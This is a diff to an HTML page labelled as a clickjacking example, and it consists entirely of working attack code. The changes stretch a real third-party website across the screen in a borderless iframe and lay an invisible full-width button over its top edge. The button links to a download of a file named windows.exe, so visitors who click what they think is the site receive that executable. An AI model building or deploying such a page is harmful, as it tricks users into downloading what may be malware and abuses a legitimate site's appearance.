@@ -4,36 +4,44 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Clickjacking Example</title>
-</head>
-<body>
     <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+        }
         iframe {
-            position:relative;
-            width:1500px;
-            height: 1080px;
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
             z-index: 1;
+            border: none;
         }
         div {
-            position:absolute;
-            top:378px;
-            right:340px;
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
             z-index: 2;
         }
         button {
-            padding: 20px 50px;
+            padding: 10px 1920px;
             background-color: rgba(0, 0, 0, 0);
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-			transform: rotate(-5deg);
         }
     </style>
+</head>
+<body>
     <div>
         <a href="./windows.exe" download>
-            <button></button>
+            <button>LIVE</button>
         </a>
     </div>
     <iframe src="https://www.sekarlaut.com/"></iframe>
 </body>
 </html>
+
